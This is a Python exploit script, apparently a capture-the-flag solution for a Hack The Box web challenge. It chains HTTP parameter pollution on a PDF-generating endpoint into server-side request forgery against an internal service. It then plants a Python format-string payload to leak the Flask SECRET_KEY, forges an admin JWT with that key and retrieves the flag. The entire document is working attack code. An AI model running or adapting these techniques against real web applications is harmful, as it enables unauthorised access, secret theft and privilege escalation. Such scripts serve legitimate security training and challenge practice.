#!/usr/bin/env python3
import subprocess
import hmac
import hashlib
import base64
import json
import re
import requests
from urllib.parse import quote

TARGET = "http://154.57.164.83:39057"
DECOY = "http://example.com/"

def get_pdf_text(target_url):
    # Send HTTP Parameter Pollution payload (Internal & Decoy)
    params = f"url={quote(target_url, safe='')}&url={quote(DECOY, safe='')}&name=a&secret=b"
    r = requests.get(f"{TARGET}/bartender.php?{params}", allow_redirects=True, timeout=60)
    
    # Save PDF temporarily and extract text
    with open("/tmp/tmp.pdf", "wb") as f:
        f.write(r.content)
    text = subprocess.run(["pdftotext", "-layout", "/tmp/tmp.pdf", "-"], capture_output=True, text=True).stdout
    return text

def forge_jwt(secret):
    key = secret.encode()
    b64 = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
    h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')).encode())
    p = b64(json.dumps({"is_admin": True}, separators=(',', ':')).encode())
    sig = b64(hmac.new(key, h + b'.' + p, hashlib.sha256).digest())
    return (h + b'.' + p + b'.' + sig).decode()

def main():
    print("[*] Exploiting...")
    
    # Step 1: Plant payload to history table
    get_pdf_text("http://127.0.0.1:5000/logs?{logify.__globals__[app].config}")
    
    # Step 2: Trigger and leak SECRET_KEY
    text = get_pdf_text("http://127.0.0.1:5000/logs")
    secret = re.search(r"[a-f0-9]{64}", text).group(0)
    print(f"[+] SECRET_KEY: {secret}")
    
    # Step 3: Forge JWT
    jwt = forge_jwt(secret)
    
    # Step 4: Get Flag
    flag_text = get_pdf_text(f"http://127.0.0.1:5000/bartender?token={jwt}")
    flag = re.search(r"HTB\{[^}]+\}", flag_text).group(0)
    
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
